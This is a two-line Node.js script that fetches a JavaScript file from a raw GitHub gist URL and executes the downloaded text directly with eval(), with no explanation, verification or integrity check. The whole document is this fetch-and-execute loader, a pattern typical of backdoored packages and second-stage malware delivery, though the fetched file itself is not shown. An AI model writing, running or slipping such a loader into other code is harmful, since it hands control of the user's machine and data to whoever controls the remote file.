const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/c932eb0313d9c3d4f8ec92a7323e40877957d03f/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
